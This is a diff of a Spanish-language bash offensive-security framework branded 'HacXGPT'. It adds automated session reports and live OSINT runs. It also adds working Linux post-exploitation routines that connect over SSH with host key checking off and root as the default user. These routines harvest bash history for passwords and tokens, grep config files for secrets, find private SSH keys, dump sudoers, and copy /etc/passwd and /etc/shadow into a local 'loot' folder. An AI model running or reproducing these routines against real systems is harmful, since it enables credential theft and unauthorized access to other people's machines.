@@ -15,6 +15,11 @@ if [ -f "$SCRIPT_DIR/core/guarden.sh" ]; then
     set +e +u 2>/dev/null || true
 fi
 
+# Cargar deteccion de plataforma y host Ollama
+if [ -f "$SCRIPT_DIR/core/platform.sh" ]; then
+    source "$SCRIPT_DIR/core/platform.sh"
+fi
+
 # Cargar integracion Ollama
 if [ -f "$SCRIPT_DIR/ollama_integration.sh" ]; then
     source "$SCRIPT_DIR/ollama_integration.sh"
@@ -962,184 +967,243 @@ suite_pentesting() {
 }
 
 # ============================================
-# 5. GENERAR REPORTES (IMPLEMENTADO)
+# 5. GENERAR REPORTES (CON DATOS REALES)
 # ============================================
 generar_reportes() {
     while true; do
         show_banner
         echo -e "${CYAN}╔══════════════════════════════════════════════╗${NC}"
-        echo -e "${CYAN}║           ${GREEN}📊 GENERAR REPORTES${CYAN}               ║${NC}"
+        echo -e "${CYAN}║           ${GREEN}📊 GENERAR REPORTES DE SESIÓN${CYAN}         ║${NC}"
         echo -e "${CYAN}╚══════════════════════════════════════════════╝${NC}"
         echo ""
         
-        echo -e "${GREEN}📝 FORMATOS DE REPORTE:${NC}"
+        echo -e "${GREEN}📝 REPORTES DINÁMICOS CON DATOS REALES (TARGET: ${CYAN}${TARGET:-NO DEFINIDO}${GREEN}):${NC}"
         echo ""
-        echo "1. Crear reporte HTML básico"
-        echo "2. Crear reporte en texto"
-        echo "3. Crear reporte en PDF"
-        echo "4. Reporte de vulnerabilidades"
-        echo "5. Plantillas personalizadas"
-        echo "6. Volver al menú principal"
+        echo "1. Generar reporte HTML de sesión actual"
+        echo "2. Generar reporte en Texto plano (.txt)"
+        echo "3. Generar reporte PDF (vía wkhtmltopdf)"
+        echo "4. Ver resumen de evidencias y técnicas en pantalla"
+        echo "5. Volver al menú principal"
         echo ""
         
-        read -p "🎯 Selecciona opción [1-6]: " opcion
+        read -p "🎯 Selecciona opción [1-5]: " opcion
         
         case $opcion in
-            1)
-                read -p "📄 Nombre del reporte HTML (sin extensión): " nombre
-                if [ -n "$nombre" ]; then
+            1|2|3)
+                local default_name="reporte_${TARGET:-sesion}_$(date +%Y%m%d_%H%M%S)"
+                read -p "📄 Nombre base del reporte [default: $default_name]: " nombre
+                nombre="${nombre:-$default_name}"
+                nombre="${nombre%.*}"
+
+                # Recopilar técnicas ejecutadas desde /tmp/hacx_techniques.json
+                local tecs_json="[]"
+                if [ -f /tmp/hacx_techniques.json ]; then
+                    tecs_json=$(cat /tmp/hacx_techniques.json 2>/dev/null || echo '{"executed": []}')
+                fi
+
+                # Recopilar logs guardados
+                local log_data=""
+                if [ -n "$OUTPUT_FILE" ] && [ -f "$OUTPUT_FILE" ]; then
+                    log_data=$(cat "$OUTPUT_FILE")
+                fi
+
+                if [ "$opcion" -eq 1 ] || [ "$opcion" -eq 3 ]; then
                     echo ""
-                    echo -e "${YELLOW}📝 CREANDO REPORTE HTML:${NC}"
-                    echo ""
-                    cat > "${nombre}.html" << HTMLREPORT
-<!DOCTYPE html>
-<html>
+                    echo -e "${YELLOW}📝 Generando reporte HTML real...${NC}"
+                    python3 -c "
+import json, html, os, sys
+
+target = '''${TARGET:-NO DEFINIDO}'''
+log_file = '''${OUTPUT_FILE:-}'''
+output_html = '''${nombre}.html'''
+
+# Cargar técnicas
+executed = []
+if os.path.exists('/tmp/hacx_techniques.json'):
+    try:
+        with open('/tmp/hacx_techniques.json', 'r') as f:
+            data = json.load(f)
+            executed = data.get('executed', [])
+    except Exception as e:
+        pass
+
+# Cargar logs de save_output
+log_content = ''
+if log_file and os.path.exists(log_file):
+    try:
+        with open(log_file, 'r', encoding='utf-8', errors='ignore') as f:
+            log_content = f.read()
+    except Exception as e:
+        log_content = str(e)
+
+html_doc = f'''<!DOCTYPE html>
+<html lang=\"es\">
 <head>
-    <title>Reporte de Seguridad - $(date)</title>
+    <meta charset=\"UTF-8\">
+    <title>Reporte de Evaluación de Seguridad - {html.escape(target)}</title>
     <style>
-        body { font-family: Arial, sans-serif; margin: 40px; }
-        h1 { color: #333; }
-        .section { margin: 20px 0; padding: 15px; background: #f5f5f5; }
-        .finding { background: #fff3cd; padding: 10px; margin: 10px 0; }
-        .critical { border-left: 5px solid #dc3545; }
-        .high { border-left: 5px solid #fd7e14; }
-        .medium { border-left: 5px solid #ffc107; }
-        .low { border-left: 5px solid #28a745; }
+        body {{ font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #0f172a; color: #f8fafc; margin: 0; padding: 30px; }}
+        .container {{ max-width: 1000px; margin: 0 auto; background: #1e293b; padding: 30px; border-radius: 12px; box-shadow: 0 10px 25px rgba(0,0,0,0.5); border: 1px solid #334155; }}
+        h1 {{ color: #38bdf8; border-bottom: 2px solid #38bdf8; padding-bottom: 10px; margin-top: 0; }}
+        h2 {{ color: #a855f7; margin-top: 25px; border-left: 4px solid #a855f7; padding-left: 10px; }}
+        .meta-box {{ background: #0f172a; padding: 15px; border-radius: 8px; display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px; border: 1px solid #334155; margin-bottom: 25px; }}
+        .meta-item {{ font-size: 14px; }}
+        .meta-item strong {{ color: #94a3b8; display: block; font-size: 12px; text-transform: uppercase; }}
+        .meta-item span {{ color: #f1f5f9; font-weight: bold; font-size: 16px; }}
+        .tech-table {{ width: 100%; border-collapse: collapse; margin-top: 15px; }}
+        .tech-table th, .tech-table td {{ padding: 12px; text-align: left; border-bottom: 1px solid #334155; }}
+        .tech-table th {{ background: #0f172a; color: #38bdf8; }}
+        .badge {{ background: #10b981; color: #047857; padding: 3px 8px; border-radius: 12px; font-size: 12px; font-weight: bold; background: #d1fae5; }}
+        .log-box {{ background: #090d16; color: #38bdf8; font-family: 'Courier New', Courier, monospace; padding: 15px; border-radius: 8px; overflow-x: auto; white-space: pre-wrap; font-size: 13px; border: 1px solid #1e293b; max-height: 500px; }}
+        .footer {{ margin-top: 40px; text-align: center; color: #64748b; font-size: 12px; border-top: 1px solid #334155; padding-top: 15px; }}
     </style>
 </head>
 <body>
-    <h1>🔐 Reporte de Seguridad</h1>
-    <p><strong>Fecha:</strong> $(date)</p>
-    <p><strong>Objetivo Principal:</strong> ${TARGET:-Ninguno}</p>
-    <p><strong>Generado por:</strong> HacXGPT v8.1</p>
-    
-    <div class="section">
-        <h2>📋 Resumen Ejecutivo</h2>
-        <p>Este reporte contiene los hallazgos de seguridad identificados durante la evaluación.</p>
-    </div>
-    
-    <div class="section">
-        <h2>🎯 Hallazgos</h2>
-        <div class="finding critical">
-            <h3>🛑 CRÍTICO: Vulnerabilidad X</h3>
-            <p><strong>Descripción:</strong> Descripción detallada...</p>
-            <p><strong>Recomendación:</strong> Recomendación de remediación...</p>
+    <div class=\"container\">
+        <h1>🛡️ Reporte Técnico de Ciberseguridad - HacXGPT v8.2</h1>
+        
+        <div class=\"meta-box\">
+            <div class=\"meta-item\">
+                <strong>Objetivo Evaludado</strong>
+                <span>{html.escape(target)}</span>
+            </div>
+            <div class=\"meta-item\">
+                <strong>Fecha del Reporte</strong>
+                <span>{html.escape('$(date "+%Y-%m-%d %H:%M:%S")')}</span>
+            </div>
+            <div class=\"meta-item\">
+                <strong>Técnicas Registradas</strong>
+                <span>{len(executed)}</span>
+            </div>
+            <div class=\"meta-item\">
+                <strong>Log de Sesión</strong>
+                <span>{'Activo (' + str(len(log_content)) + ' bytes)' if log_content else 'Sin logs guardados'}</span>
+            </div>
         </div>
-        <div class="finding high">
-            <h3>⚠️ ALTO: Vulnerabilidad Y</h3>
-            <p>Descripción...</p>
+
+        <h2>🎯 Técnicas MITRE ATT&CK Ejecutadas</h2>
+'''
+
+if executed:
+    html_doc += '''<table class=\"tech-table\">
+            <thead>
+                <tr>
+                    <th>ID Técnica</th>
+                    <th>Nombre de Técnica / Módulo</th>
+                    <th>Timestamp</th>
+                </tr>
+            </thead>
+            <tbody>'''
+    for t in executed:
+        html_doc += f'''
+                <tr>
+                    <td><b style=\"color:#38bdf8;\">{html.escape(t.get('id', ''))}</b></td>
+                    <td>{html.escape(t.get('name', ''))}</td>
+                    <td><span class=\"badge\">{html.escape(t.get('timestamp', ''))}</span></td>
+                </tr>'''
+    html_doc += '''
+            </tbody>
+        </table>'''
+else:
+    html_doc += '''<p style=\"color:#94a3b8; font-style: italic;\">No se han registrado técnicas en esta sesión aún.</p>'''
+
+html_doc += f'''
+        <h2>📋 Evidencias & Salidas de Comandos Reales (save_output)</h2>
+        {'<div class=\"log-box\">' + html.escape(log_content) + '</div>' if log_content else '<p style=\"color:#94a3b8; font-style: italic;\">No hay evidencia guardada. Recordá activar el guardado presionado <b>S</b> en el menú principal.</p>'}
+
+        <div class=\"footer\">
+            Generado automáticamente por HacXGPT v8.2 — MITRE ATT&CK Framework Edition
         </div>
-    </div>
-    
-    <div class="section">
-        <h2>📊 Métricas</h2>
-        <p>Total de hallazgos: 5</p>
-        <p>Críticos: 1 | Altos: 2 | Medios: 1 | Bajos: 1</p>
-    </div>
-    
-    <div class="section">
-        <h2>🔧 Herramientas Utilizadas</h2>
-        <ul>
-            <li>Nmap - Escaneo de puertos</li>
-            <li>Nikto - Escaneo web</li>
-            <li>SQLMap - Testing SQL Injection</li>
-            <li>Metasploit - Explotación</li>
-        </ul>
     </div>
 </body>
-</html>
-HTMLREPORT
-                    echo -e "${GREEN}✅ Reporte HTML creado: ${nombre}.html${NC}"
+</html>'''
+
+with open(output_html, 'w', encoding='utf-8') as f:
+    f.write(html_doc)
+
+print(f'✅ Reporte HTML generado: {output_html}')
+"
+                    echo -e "${GREEN}✅ Reporte HTML generado exitosamente: ${nombre}.html${NC}"
+
+                    if [ "$opcion" -eq 3 ]; then
+                        if check_command wkhtmltopdf "sudo apt install wkhtmltopdf"; then
+                            echo -e "${YELLOW}🔄 Convirtiendo a PDF vía wkhtmltopdf...${NC}"
+                            wkhtmltopdf "${nombre}.html" "${nombre}.pdf" &>/dev/null
+                            echo -e "${GREEN}✅ PDF creado exitosamente: ${nombre}.pdf${NC}"
+                        fi
+                    fi
                 fi
-                ;;
-            2)
-                read -p "📄 Nombre del reporte en texto: " nombre
-                if [ -n "$nombre" ]; then
+
+                if [ "$opcion" -eq 2 ]; then
                     echo ""
-                    echo -e "${YELLOW}📝 CREANDO REPORTE DE TEXTO:${NC}"
-                    echo ""
-                    cat > "${nombre}.txt" << TEXTREPORT
-================================================================
-                    REPORTE DE SEGURIDAD
-================================================================
-Fecha: $(date)
-Objetivo: ${TARGET:-Ninguno}
-Generado por: HacXGPT v8.1
-
-RESUMEN EJECUTIVO
-=================
-Este documento contiene los hallazgos de seguridad identificados
-durante la evaluación técnica.
-
-HALLAZGOS
-=========
-[+] CRÍTICO: Vulnerabilidad X
-    • Descripción: Servicio vulnerable a RCE
-    • Impacto: Alto - Posible compromiso total
-    • Recomendación: Actualizar a versión 2.0.1
-
-[+] ALTO: Configuración insegura
-    • Descripción: Credenciales por defecto
-    • Impacto: Medio - Acceso no autorizado
-    • Recomendación: Cambiar credenciales
-
-HERRAMIENTAS UTILIZADAS
-=======================
-- Nmap 7.91
-- Nikto 2.1.6
-- SQLMap 1.5.2
-- Metasploit 6.0
-
-CONCLUSIONES
-============
-Se recomienda implementar las correcciones en un plazo de 30 días.
-TEXTREPORT
+                    echo -e "${YELLOW}📝 Generando reporte de Texto plano con datos reales...${NC}"
+                    {
+                        echo "================================================================================"
+                        echo "              REPORTE TÉCNICO DE CIBERSEGURIDAD — HACXGPT v8.2"
+                        echo "================================================================================"
+                        echo "Fecha: $(date)"
+                        echo "Objetivo ($TARGET): ${TARGET:-NO DEFINIDO}"
+                        echo "Archivo de Log: ${OUTPUT_FILE:-Ninguno}"
+                        echo "================================================================================"
+                        echo ""
+                        echo "🎯 TÉCNICAS MITRE ATT&CK REGISTRADAS EN LA SESIÓN:"
+                        echo "--------------------------------------------------------------------------------"
+                        if [ -f /tmp/hacx_techniques.json ]; then
+                            python3 -c "
+import json
+with open('/tmp/hacx_techniques.json') as f:
+    data = json.load(f)
+for t in data.get('executed', []):
+    print(f\"  • [{t['id']}] {t['name']} (Hora: {t.get('timestamp', 'N/A')})\")
+" 2>/dev/null || echo "  (Sin técnicas registradas)"
+                        else
+                            echo "  (Sin técnicas registradas)"
+                        fi
+                        echo ""
+                        echo "📋 EVIDENCIAS Y SALIDAS DE COMANDOS REGISTRADAS (save_output):"
+                        echo "--------------------------------------------------------------------------------"
+                        if [ -n "$OUTPUT_FILE" ] && [ -f "$OUTPUT_FILE" ]; then
+                            cat "$OUTPUT_FILE"
+                        else
+                            echo "  (Sin logs guardados en esta sesión. Activa el guardado con 'S' en el menú principal)"
+                        fi
+                        echo ""
+                        echo "================================================================================"
+                        echo "              Fin del Reporte — HacXGPT Framework"
+                        echo "================================================================================"
+                    } > "${nombre}.txt"
                     echo -e "${GREEN}✅ Reporte de texto creado: ${nombre}.txt${NC}"
                 fi
                 ;;
-            3)
-                echo ""
-                echo -e "${YELLOW}📝 PARA CREAR PDFS:${NC}"
-                echo ""
-                echo "• Instalar wkhtmltopdf:"
-                echo "  sudo apt install wkhtmltopdf"
-                echo ""
-                echo "• Convertir HTML a PDF:"
-                echo "  wkhtmltopdf reporte.html reporte.pdf"
-                echo ""
-                echo "• Usar pandoc (más formatos):"
-                echo "  pandoc reporte.md -o reporte.pdf"
-                ;;
             4)
                 echo ""
-                echo -e "${YELLOW}📊 PLANTILLAS DE VULNERABILIDADES:${NC}"
+                echo -e "${CYAN}📊 RESUMEN DE EVIDENCIAS Y TELEMETRÍA EN PANTALLA:${NC}"
+                echo -e "${YELLOW}🎯 Objetivo:${NC} ${TARGET:-NO DEFINIDO}"
+                echo -e "${YELLOW}📁 Archivo log actual:${NC} ${OUTPUT_FILE:-Desactivado}"
                 echo ""
-                echo "1. SQL Injection:"
-                echo "   • CVSS: 9.8 (CRÍTICO)"
-                echo "   • CWE: CWE-89"
-                echo "   • Remedio: Prepared Statements"
+                echo -e "${GREEN}✅ Técnicas MITRE Ejecutadas (/tmp/hacx_techniques.json):${NC}"
+                if [ -f /tmp/hacx_techniques.json ]; then
+                    python3 -c "
+import json
+with open('/tmp/hacx_techniques.json') as f:
+    data = json.load(f)
+for t in data.get('executed', []):
+    print(f\"   🟢 {t['id']} - {t['name']} ({t.get('timestamp', '')})\")
+" 2>/dev/null
+                else
+                    echo "   (Ninguna técnica registrada aún)"
+                fi
                 echo ""
-                echo "2. XSS:"
-                echo "   • CVSS: 7.5 (ALTO)"
-                echo "   • CWE: CWE-79"
-                echo "   • Remedio: Output Encoding"
-                echo ""
-                echo "3. CSRF:"
-                echo "   • CVSS: 8.0 (ALTO)"
-                echo "   • CWE: CWE-352"
-                echo "   • Remedio: Tokens Anti-CSRF"
+                echo -e "${GREEN}📋 Últimas 15 líneas del Log de Sesión:${NC}"
+                if [ -n "$OUTPUT_FILE" ] && [ -f "$OUTPUT_FILE" ]; then
+                    echo -e "${BLUE}--------------------------------------------------${NC}"
+                    tail -n 15 "$OUTPUT_FILE"
+                    echo -e "${BLUE}--------------------------------------------------${NC}"
+                else
+                    echo "   (No hay archivo log activo de sesión)"
+                fi
                 ;;
             5)
-                echo ""
-                echo -e "${YELLOW}🎨 PERSONALIZACIÓN DE REPORTES:${NC}"
-                echo ""
-                echo "• Agregar logo de empresa"
-                echo "• Colores corporativos"
-                echo "• Secciones personalizadas"
-                echo "• Firmas digitales"
-                echo "• Métricas específicas"
-                ;;
-            6)
                 return
                 ;;
             *)
@@ -1208,14 +1272,31 @@ herramientas_avanzadas() {
                 echo "• Autopsy: interfaz gráfica forense"
                 ;;
             4)
-                echo ""
-                echo -e "${YELLOW}🌐 OSINT - INTELIGENCIA ABIERTA:${NC}"
-                echo ""
-                echo "• Recon-ng: framework OSINT"
-                echo "• Maltego: visualización de datos"
-                echo "• Shodan: shodan search apache"
-                echo "• theHarvester: búsqueda de emails"
-                echo "• spiderfoot: automatización OSINT"
+                read -p "🌐 Objetivo para recon OSINT (Dominio/IP) [default: ${TARGET:-ejemplo.com}]: " target_osint
+                target_osint="${target_osint:-$TARGET}"
+                if [ -n "$target_osint" ]; then
+                    echo ""
+                    echo -e "${YELLOW}🔍 Ejecutando reconocimiento OSINT contra $target_osint...${NC}"
+                    echo ""
+                    local output=""
+                    
+                    if check_command "recon-ng" "sudo apt install recon-ng"; then
+                        echo -e "${CYAN}▶ Lanzando recon-ng en modo batch...${NC}"
+                        output=$(recon-ng -m hackertarget -c "options set SOURCE $target_osint; run; exit" 2>&1)
+                        echo "$output"
+                        save_output "[RECON-NG $target_osint]\n$output"
+                        type track_technique &>/dev/null && track_technique "T1593" "Search Open Technical Databases (recon-ng)"
+                    elif command -v theHarvester &>/dev/null; then
+                        echo -e "${YELLOW}ℹ️ recon-ng no disponible, usando theHarvester como fallback...${NC}"
+                        echo -e "${CYAN}▶ Ejecutando theHarvester...${NC}"
+                        output=$(theHarvester -d "$target_osint" -b google,bing 2>&1)
+                        echo "$output"
+                        save_output "[THEHARVESTER OSINT $target_osint]\n$output"
+                        type track_technique &>/dev/null && track_technique "T1589" "Gather Victim Identity Information (theHarvester)"
+                    else
+                        echo -e "${YELLOW}💡 Sugerencia de instalación:${NC} sudo apt install recon-ng  (o sudo apt install theharvester)"
+                    fi
+                fi
                 ;;
             5)
                 echo ""
@@ -2132,34 +2213,136 @@ LINUX_DATA[6]="🔴 ATAQUE:
 |||
 🟣 DETECCIÓN:  auditd: find y locate agresivos en filesystem"
 
+_prompt_ssh_creds() {
+    local default_target="${TARGET:-localhost}"
+    read -p "🎯 Host / IP objetivo SSH [default: $default_target]: " ssh_host
+    ssh_host="${ssh_host:-$default_target}"
+    read -p "👤 Usuario SSH [default: root]: " ssh_user
+    ssh_user="${ssh_user:-root}"
+    read -p "🔌 Puerto SSH [default: 22]: " ssh_port
+    ssh_port="${ssh_port:-22}"
+    read -p "🔑 Ruta a clave privada SSH (dejar en blanco para usar password/agent): " ssh_key
+
+    SSH_CMD_BASE="ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 -p $ssh_port"
+    SCP_CMD_BASE="scp -P $ssh_port -o StrictHostKeyChecking=no -o ConnectTimeout=5"
+    if [ -n "$ssh_key" ]; then
+        SSH_CMD_BASE="$SSH_CMD_BASE -i $ssh_key"
+        SCP_CMD_BASE="$SCP_CMD_BASE -i $ssh_key"
+    fi
+    SSH_TARGET_STR="${ssh_user}@${ssh_host}"
+}
+
 post_explotacion_linux() {
     while true; do
         show_banner
         echo -e "${RED}╔══════════════════════════════════════════════════╗${NC}"
-        echo -e "${RED}║       ${YELLOW}🐧 POST-EXPLOTACIÓN — LINUX${NC}              ${RED}║${NC}"
+        echo -e "${RED}║       ${YELLOW}🐧 POST-EXPLOTACIÓN — LINUX (REAL)${NC}         ${RED}║${NC}"
         echo -e "${RED}╚══════════════════════════════════════════════════╝${NC}"
         echo ""
         echo "1. T1552.003 — Credentials in Bash History"
         echo "2. T1552.002 — Credentials in Files (config files)"
         echo "3. T1552.004 — Private SSH Keys"
-        echo "4. T1548.003 — Sudo Token Impersonation"
-        echo "5. T1003.008 — /etc/passwd y /etc/shadow"
-        echo "6. T1083 — Enumeración de directories sensibles"
+        echo "4. T1548.003 — Sudo Token Impersonation (sudo -l / permissions)"
+        echo "5. T1003.008 — Exfiltrar /etc/passwd & /etc/shadow"
+        echo "6. T1083 — Enumeración de directorios y binarios SUID"
         echo "7. Volver"
         echo ""
         read -p "💣 Selecciona [1-7]: " op
-        if preguntar_objetivo; then
-            case $op in
-                1) _show_post_exploitation "${LINUX_DATA[1]}" "T1552.003 — Bash History" ;;
-                2) _show_post_exploitation "${LINUX_DATA[2]}" "T1552.002 — Credentials in Files" ;;
-                3) _show_post_exploitation "${LINUX_DATA[3]}" "T1552.004 — Private SSH Keys" ;;
-                4) _show_post_exploitation "${LINUX_DATA[4]}" "T1548.003 — Sudo Token Impersonation" ;;
-                5) _show_post_exploitation "${LINUX_DATA[5]}" "T1003.008 — /etc/passwd & /etc/shadow" ;;
-                6) _show_post_exploitation "${LINUX_DATA[6]}" "T1083 — File & Directory Discovery" ;;
-                7) return ;;
-                *) echo -e "${RED}❌ Opción no válida${NC}" ;;
-            esac
-        fi
+        case $op in
+            1)
+                _prompt_ssh_creds
+                if confirm_risk "Credentials in Bash History ($SSH_TARGET_STR)" "ALTO" "$SSH_TARGET_STR"; then
+                    if check_command ssh "sudo apt install openssh-client"; then
+                        echo ""
+                        echo -e "${YELLOW}🔍 Ejecutando inspección de historial bash en $SSH_TARGET_STR...${NC}"
+                        local output
+                        output=$($SSH_CMD_BASE "$SSH_TARGET_STR" "cat ~/.bash_history 2>/dev/null; grep -i -E 'pass|secret|key|token|aws|api' ~/.bash_history 2>/dev/null" 2>&1)
+                        echo "$output"
+                        save_output "[LINUX POST-EXP T1552.003 $SSH_TARGET_STR]\n$output"
+                        type track_technique &>/dev/null && track_technique "T1552.003" "Credentials in Bash History"
+                    fi
+                fi
+                ;;
+            2)
+                _prompt_ssh_creds
+                if confirm_risk "Credentials in Files ($SSH_TARGET_STR)" "ALTO" "$SSH_TARGET_STR"; then
+                    if check_command ssh "sudo apt install openssh-client"; then
+                        echo ""
+                        echo -e "${YELLOW}🔍 Buscando archivos de configuración con credenciales en $SSH_TARGET_STR...${NC}"
+                        local output
+                        output=$($SSH_CMD_BASE "$SSH_TARGET_STR" "grep -rn -E 'password|passwd|secret|token' /etc/ 2>/dev/null | head -n 30; find / -name '*.env' -o -name 'wp-config.php' 2>/dev/null | head -n 20" 2>&1)
+                        echo "$output"
+                        save_output "[LINUX POST-EXP T1552.002 $SSH_TARGET_STR]\n$output"
+                        type track_technique &>/dev/null && track_technique "T1552.002" "Credentials in Files"
+                    fi
+                fi
+                ;;
+            3)
+                _prompt_ssh_creds
+                if confirm_risk "Private SSH Keys Discovery ($SSH_TARGET_STR)" "ALTO" "$SSH_TARGET_STR"; then
+                    if check_command ssh "sudo apt install openssh-client"; then
+                        echo ""
+                        echo -e "${YELLOW}🔍 Buscando llaves SSH privadas en $SSH_TARGET_STR...${NC}"
+                        local output
+                        output=$($SSH_CMD_BASE "$SSH_TARGET_STR" "find / -name 'id_rsa' -o -name 'id_ed25519' -o -name 'authorized_keys' 2>/dev/null" 2>&1)
+                        echo "$output"
+                        save_output "[LINUX POST-EXP T1552.004 $SSH_TARGET_STR]\n$output"
+                        type track_technique &>/dev/null && track_technique "T1552.004" "Private SSH Keys"
+                    fi
+                fi
+                ;;
+            4)
+                _prompt_ssh_creds
+                if confirm_risk "Sudo Privilege Check ($SSH_TARGET_STR)" "ALTO" "$SSH_TARGET_STR"; then
+                    if check_command ssh "sudo apt install openssh-client"; then
+                        echo ""
+                        echo -e "${YELLOW}🔍 Verificando privilegios sudo en $SSH_TARGET_STR...${NC}"
+                        local output
+                        output=$($SSH_CMD_BASE "$SSH_TARGET_STR" "sudo -n -l 2>&1; cat /etc/sudoers 2>/dev/null | grep -v '^#'" 2>&1)
+                        echo "$output"
+                        save_output "[LINUX POST-EXP T1548.003 $SSH_TARGET_STR]\n$output"
+                        type track_technique &>/dev/null && track_technique "T1548.003" "Sudo Token Impersonation"
+                    fi
+                fi
+                ;;
+            5)
+                _prompt_ssh_creds
+                if confirm_risk "Dump /etc/passwd & /etc/shadow ($SSH_TARGET_STR)" "ALTO" "$SSH_TARGET_STR"; then
+                    if check_command scp "sudo apt install openssh-client"; then
+                        echo ""
+                        echo -e "${YELLOW}🔍 Descargando /etc/passwd y /etc/shadow desde $SSH_TARGET_STR...${NC}"
+                        local local_dir="loot_${ssh_host}_$(date +%s)"
+                        mkdir -p "$local_dir"
+                        $SCP_CMD_BASE "$SSH_TARGET_STR:/etc/passwd" "$local_dir/passwd" 2>/dev/null
+                        $SCP_CMD_BASE "$SSH_TARGET_STR:/etc/shadow" "$local_dir/shadow" 2>/dev/null
+                        if [ -f "$local_dir/passwd" ]; then
+                            echo -e "${GREEN}✅ /etc/passwd descargado en $local_dir/passwd${NC}"
+                        fi
+                        if [ -f "$local_dir/shadow" ]; then
+                            echo -e "${GREEN}✅ /etc/shadow descargado en $local_dir/shadow${NC}"
+                        fi
+                        save_output "[LINUX POST-EXP T1003.008 $SSH_TARGET_STR]\nArchivos descargados en $local_dir"
+                        type track_technique &>/dev/null && track_technique "T1003.008" "/etc/passwd y /etc/shadow"
+                    fi
+                fi
+                ;;
+            6)
+                _prompt_ssh_creds
+                if confirm_risk "File & Directory Discovery ($SSH_TARGET_STR)" "ALTO" "$SSH_TARGET_STR"; then
+                    if check_command ssh "sudo apt install openssh-client"; then
+                        echo ""
+                        echo -e "${YELLOW}🔍 Enumerando binarios SUID y directorios escribibles en $SSH_TARGET_STR...${NC}"
+                        local output
+                        output=$($SSH_CMD_BASE "$SSH_TARGET_STR" "echo '=== BINARIOS SUID ==='; find / -perm -4000 2>/dev/null | head -n 30; echo '=== DIRECTORIOS SENSIBLES ==='; ls -la /opt /srv /data /backup 2>/dev/null" 2>&1)
+                        echo "$output"
+                        save_output "[LINUX POST-EXP T1083 $SSH_TARGET_STR]\n$output"
+                        type track_technique &>/dev/null && track_technique "T1083" "File and Directory Discovery"
+                    fi
+                fi
+                ;;
+            7) return ;;
+            *) echo -e "${RED}❌ Opción no válida${NC}" ;;
+        esac
         echo ""
         read -p "↵ Enter para continuar..." _
     done
